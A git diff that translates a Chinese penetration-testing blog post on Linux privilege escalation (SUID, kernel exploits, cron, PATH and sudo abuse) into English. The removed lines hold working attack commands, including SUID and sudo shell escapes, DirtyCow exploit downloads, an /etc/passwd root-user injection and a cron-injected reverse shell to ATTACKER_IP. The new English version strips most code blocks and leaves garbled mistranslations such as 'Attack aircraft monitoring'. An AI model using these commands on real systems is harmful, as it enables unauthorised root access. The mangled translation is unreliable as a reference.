@@ -1,28 +1,27 @@
 ---
-title: "提权技术详解 — SUID、内核漏洞、Cron 定时任务利用"
-url: linux-privilege-escalation
+title: "Detailed explanation of privilege escalation techniques - SUID, kernel vulnerabilities, Cron scheduled task exploitation"
+url: "en/linux-privilege-escalation"
 date: "2026-01-13"
 draft: false
-summary: "Linux提权技术全面解析，SUID/SGID利用、内核漏洞提权、Cron任务劫持与LinPEAS自动化枚举"
+summary: "Comprehensive analysis of Linux privilege escalation technology, SUID/SGID exploitation, kernel vulnerability privilege escalation, Cron task hijacking and LinPEAS automated enumeration"
 authors: ["default"]
 tags:
   - Linux
-  - 提权
+  - Elevate privileges
   - SUID
-  - 内核漏洞
+  - kernel vulnerability
 images: ["https://images.unsplash.com/photo-1618401471353-b98afee0b2eb?auto=format&fit=crop&w=1200&q=80"]
 categories:
   - cyber-security
 ---
 
+# Detailed explanation of privilege escalation technology - SUID, kernel vulnerability, Cron scheduled task exploitation
 
-# 提权技术详解 — SUID、内核漏洞、Cron 定时任务利用
+In penetration testing, obtaining the initial Shell is often just a low-privileged user (such as www-data, nobody). To truly control the target system, we need to perform privilege escalation (Privilege Escalation) to upgrade the ordinary user privileges to root. Linux privilege escalation is a systematic technology, involving multiple dimensions such as file permissions, kernel vulnerabilities, and system configuration defects. This article will comprehensively explain various privilege escalation techniques in the Linux environment, from principles to practice, and help you master the complete path from low privileges to root.
 
-在渗透测试中，获取初始 Shell 往往只是一个低权限用户（如 www-data、nobody），要真正控制目标系统，我们需要进行权限提升（Privilege Escalation），将普通用户权限提升为 root。Linux 提权是一门系统化的技术，涉及文件权限、内核漏洞、系统配置缺陷等多个维度。本文将全面讲解 Linux 环境下的各种提权技术，从原理到实战，帮助你掌握从低权限到 root 的完整路径。
+## Linux permission model basics
 
-## Linux 权限模型基础
-
-在开始提权之前，我们需要理解 Linux 的权限模型：
+Before we start escalating privileges, we need to understand the Linux permission model:
 
 ```bash
 # 查看当前用户身份
@@ -60,44 +59,25 @@ cat /etc/os-release
 cat /etc/issue
 hostnamectl
 
-# 当前用户权限
-id
-sudo -l                    # 查看 sudo 配置（非常重要！）
-cat /etc/sudoers           # 需要权限
+# Current user permissions
 
-# 系统中的其他用户
-cat /etc/passwd | grep -v nologin | grep -v false
-ls -la /home/
+# other users in the system
 
-# 网络信息
-ifconfig / ip addr
-netstat -tulnp / ss -tulnp
-route -n
+# Network information
 
-# 运行中的进程
-ps aux
-ps aux | grep root         # 查看 root 进程
+# running process
 
-# 定时任务
-crontab -l                 # 当前用户的 cron
-ls -la /etc/cron*          # 系统级 cron
-cat /etc/crontab
-systemctl list-timers      # systemd 定时器
+# scheduled tasks
 
-# 可写目录和文件
-find / -writable -type d 2>/dev/null
-find / -writable -type f 2>/dev/null
+# Writable directories and files
 
-# 查看环境变量
-env
-echo $PATH
-```
+# View environment variables
 
-## SUID/SGID 提权
+## SUID/SGID privilege escalation
 
-SUID（Set User ID）是 Linux 提权中最经典的攻击面之一。当一个可执行文件设置了 SUID 位时，任何用户运行该程序时都会以文件所有者（通常是 root）的身份执行。
+SUID (Set User ID) is one of the most classic attack surfaces in Linux privilege escalation. When an executable file has the SUID bit set, any user who runs the program will execute as the file owner (usually root).
 
-### 查找 SUID 文件
+### Find SUID file
 
 ```bash
 # 查找所有 SUID 文件
@@ -128,60 +108,37 @@ GTFOBins（https://gtfobins.github.io/）是一个收集了各种 Unix 二进制
 # 如果 find 有 SUID 位
 find . -exec /bin/sh -p \; -quit
 
-# === vim 提权 ===
-vim -c ':!/bin/sh'
+# === vim privilege escalation ===
 
-# === python 提权 ===
-python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+# === python privilege escalation ===
 
-# === bash 提权 ===
-# 如果 bash 有 SUID 位
-bash -p
+# === bash privilege escalation ===
 
-# === nmap 提权（旧版本）===
-# nmap 2.02 - 5.21 有交互模式
-nmap --interactive
-!sh
+# === nmap privilege escalation (old version) ===
 
-# === env 提权 ===
-env /bin/sh -p
+# === env privilege escalation ===
 
-# === less/more 提权 ===
-less /etc/passwd
-!/bin/sh
+# === less/more privilege escalation ===
 
-# === cp 提权 ===
-# 复制 /etc/passwd，添加 root 用户
-# 生成密码哈希
-openssl passwd -1 -salt hacker password123
-# 结果: $1$hacker$6luIRwdGpBvXdP.GMwcZp/
+# === cp privilege escalation ===
 
-# 添加到 passwd 文件
-echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0::/root:/bin/bash' >> /tmp/passwd
-cp /tmp/passwd /etc/passwd
+# Add to passwd file
 
-# su 切换到新用户
-su hacker
-# 密码: password123
+# su switches to a new user
 
-# === node 提权 ===
-node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
+# === node privilege escalation ===
 
-# === perl 提权 ===
-perl -e 'exec "/bin/sh";'
+# === perl privilege escalation ===
 
-# === ruby 提权 ===
-ruby -e 'exec "/bin/sh"'
+# === ruby ​​privilege escalation ===
 
-# === php 提权 ===
-php -r "pcntl_exec('/bin/sh', ['-p']);"
-```
+# === php privilege escalation ===
 
-## 内核漏洞提权
+## Kernel vulnerability privilege escalation
 
-当系统内核版本较旧时，可能存在已知的内核漏洞可以直接获取 root 权限。
+When the system kernel version is older, there may be known kernel vulnerabilities that can directly obtain root privileges.
 
-### 检测内核版本
+### Detect kernel version
 
 ```bash
 # 查看内核版本
@@ -204,29 +161,19 @@ DirtyCow 是 Linux 内核中一个存在了近 10 年的竞态条件漏洞，影
 uname -r
 # 如果版本在 2.6.22 - 4.8.3 之间，可能受影响
 
-# 方法一：使用 dirtycow 修改 /etc/passwd
-# 下载利用代码
-wget https://www.exploit-db.com/download/40839 -O dirty.c
+# Method 1: Use dirtycow to modify /etc/passwd
 
-# 编译
-gcc -pthread dirty.c -o dirty -lcrypt
+# compile
 
-# 运行（会创建一个新的 root 用户 "firefart"）
-./dirty my_new_password
+# Run (will create a new root user "firefart")
 
-# 登录
-su firefart
-# 密码: my_new_password
+# Log in
 
-# 方法二：使用 cowroot
-wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/cowroot.c
-gcc cowroot.c -o cowroot -pthread
-./cowroot
-```
+# Method 2: Use cowroot
 
 ### DirtyPipe（CVE-2022-0847）
 
-DirtyPipe 影响 Linux 5.8 至 5.16.11 之间的内核版本，可以覆写任意只读文件。
+DirtyPipe affects Linux kernel versions between 5.8 and 5.16.11 and can overwrite any read-only file.
 
 ```bash
 # 检查是否受影响
@@ -251,16 +198,13 @@ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linu
 chmod +x linux-exploit-suggester.sh
 ./linux-exploit-suggester.sh
 
-# linux-exploit-suggester2 (Python版本)
-wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
-perl linux-exploit-suggester-2.pl
-```
+# linux-exploit-suggester2 (Python version)
 
-## Cron 定时任务提权
+## Cron scheduled task privilege escalation
 
-Cron 定时任务是 Linux 系统的任务调度机制。如果 root 用户的 cron 任务执行的脚本对当前用户可写，就可以被利用来提权。
+Cron scheduled tasks are the task scheduling mechanism of Linux systems. If the script executed by the root user's cron task is writable by the current user, it can be exploited to escalate privileges.
 
-### 发现可利用的 Cron 任务
+### Discover exploitable cron tasks
 
 ```bash
 # 查看系统级 crontab
@@ -289,32 +233,21 @@ chmod +x pspy64
 # 假设发现 /etc/crontab 中有以下条目：
 # * * * * * root /opt/scripts/backup.sh
 
-# 检查脚本权限
-ls -la /opt/scripts/backup.sh
-# 如果当前用户对该脚本有写权限
+# Check script permissions
 
-# 方法一：写入反弹 Shell
-echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh
+# Method 1: Write a rebound shell
 
-# 攻击机监听
-nc -lvnp 4444
+# Attack aircraft monitoring
 
-# 方法二：添加 SUID bash
-echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
+# Method 2: Add SUID bash
 
-# 等待 cron 执行后
-/tmp/rootbash -p
-# 获得 root shell
+# Wait for cron to execute
 
-# 方法三：将当前用户加入 sudoers
-echo 'echo "username ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> /opt/scripts/backup.sh
-# 等待执行后
-sudo su
-```
+# Method 3: Add the current user to sudoers
 
-### PATH 劫持提权
+### PATH hijacking and privilege escalation
 
-如果 cron 任务中的脚本调用了命令但没有使用绝对路径，可以通过修改 PATH 环境变量来劫持。
+If a script in a cron task calls a command but does not use an absolute path, it can be hijacked by modifying the PATH environment variable.
 
 ```bash
 # 假设 cron 脚本内容为：
@@ -356,24 +289,17 @@ chmod +x shell.sh
 # 如果发现 SUID 程序内部调用了系统命令（未使用绝对路径）
 # 例如一个 SUID 程序调用了 "service apache2 restart"
 
-# 使用 strings 查看程序调用的命令
-strings /usr/local/bin/suid_program
+# Use strings to view the commands called by the program
 
-# 创建恶意的 service 命令
-echo '/bin/bash -p' > /tmp/service
-chmod +x /tmp/service
+# Create malicious service commands
 
-# 修改 PATH（将 /tmp 放在最前面）
-export PATH=/tmp:$PATH
+# Modify PATH (put /tmp first)
 
-# 执行 SUID 程序
-/usr/local/bin/suid_program
-# 获得 root shell
-```
+# Execute SUID program
 
-### LD_PRELOAD 提权
+### LD_PRELOAD Privilege Elevation
 
-如果 sudo 配置中保留了 LD_PRELOAD 环境变量，可以用来提权。
+If the LD_PRELOAD environment variable is retained in the sudo configuration, it can be used to escalate privileges.
 
 ```bash
 # 检查 sudo 配置
@@ -409,65 +335,43 @@ sudo LD_PRELOAD=/tmp/shell.so find
 # 查看 sudo 权限
 sudo -l
 
-# === 常见可利用的 sudo 配置 ===
+# === Commonly exploitable sudo configurations ===
 
 # (root) NOPASSWD: /usr/bin/vim
-sudo vim -c ':!/bin/bash'
 
 # (root) NOPASSWD: /usr/bin/find
-sudo find / -exec /bin/bash \; -quit
 
 # (root) NOPASSWD: /usr/bin/python3
-sudo python3 -c 'import os; os.system("/bin/bash")'
 
 # (root) NOPASSWD: /usr/bin/perl
-sudo perl -e 'exec "/bin/bash";'
 
 # (root) NOPASSWD: /usr/bin/ruby
-sudo ruby -e 'exec "/bin/bash"'
 
 # (root) NOPASSWD: /usr/bin/less
-sudo less /etc/hosts
-!/bin/bash
 
 # (root) NOPASSWD: /usr/bin/awk
-sudo awk 'BEGIN {system("/bin/bash")}'
 
 # (root) NOPASSWD: /usr/bin/man
-sudo man man
-!/bin/bash
 
 # (root) NOPASSWD: /usr/bin/ftp
-sudo ftp
-ftp> !/bin/bash
 
 # (root) NOPASSWD: /usr/bin/socat
-sudo socat stdin exec:/bin/bash
 
 # (root) NOPASSWD: /usr/bin/zip
-sudo zip /tmp/1.zip /tmp/1 -T --unzip-command="sh -c /bin/bash"
 
 # (root) NOPASSWD: /usr/bin/tar
-sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
 
 # (root) NOPASSWD: /usr/bin/env
-sudo env /bin/bash
 
 # (root) NOPASSWD: /usr/bin/nano
-sudo nano
-# Ctrl+R, Ctrl+X
-# 输入: reset; bash 1>&0 2>&0
 
 # (root) NOPASSWD: /usr/bin/apache2
-# 读取敏感文件
-sudo apache2 -f /etc/shadow
-```
 
-## 自动化枚举工具
+## Automated enumeration tools
 
 ### LinPEAS
 
-LinPEAS 是最强大的 Linux 提权枚举脚本，会自动检测几乎所有可能的提权路径。
+LinPEAS is the most powerful Linux privilege escalation enumeration script, automatically detecting almost all possible privilege escalation paths.
 
 ```bash
 # 下载 LinPEAS
@@ -506,9 +410,7 @@ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 chmod +x LinEnum.sh
 ./LinEnum.sh -t
 
-# 详细模式
-./LinEnum.sh -t -k password -e /tmp/output -r report.txt
-```
+# verbose mode
 
 ### linux-smart-enumeration
 
